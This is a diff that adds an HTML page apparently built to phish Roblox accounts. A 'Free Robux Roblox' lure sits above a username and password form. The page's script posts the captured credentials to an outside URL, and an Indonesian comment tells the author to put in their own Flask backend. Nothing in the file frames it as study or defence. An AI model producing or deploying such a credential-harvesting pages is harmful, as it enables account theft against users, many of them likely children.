@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  </style>
+</head>
+<body class="bg-[#c9d9db] flex items-center justify-center min-h-screen font-['Roboto']">
+  <div class="flex flex-col items-center space-y-6">
+    <div class="text-white text-lg font-semibold">
+      Free Robux Roblox
+    </div>
+    <img alt="User profile icon" class="w-24 h-24 rounded-full border border-white" src="https://storage.googleapis.com/a1aa/image/243dbcea-67b9-48cd-70fb-73c91eda0ce6.jpg" />
+    
+    <form id="registerForm" class="flex flex-col space-y-4 w-64">
+      <input id="username" name="username" required class="rounded-full py-2 px-4 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#a3c1bb] bg-white" placeholder="username" type="text" />
+      <input id="password" name="password" required class="rounded-full py-2 px-4 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#a3c1bb] bg-white" placeholder="password" type="password" />
+      <button type="submit" class="rounded-full bg-gradient-to-b from-[#3a414a] to-[#1a1e23] text-white text-sm font-semibold py-2 shadow-md hover:brightness-110 transition">
+        Apply
+      </button>
+      <p id="status" class="text-center text-sm text-green-600"></p>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("registerForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      fetch("https://zonathan-sigma.github.io/My-login_page/", { // Ganti sesuai URL backend Flask lo ya
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+      })
+      .then(res => {
+        if (!res.ok) throw new Error("Network response was not ok");
+        return res.text();
+      })
+      .then(data => {
+        document.getElementById("status").innerText = data;
+        document.getElementById("registerForm").reset();
+      })
+      .catch(err => {
+        document.getElementById("status").innerText = "Gagal kirim data.";
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
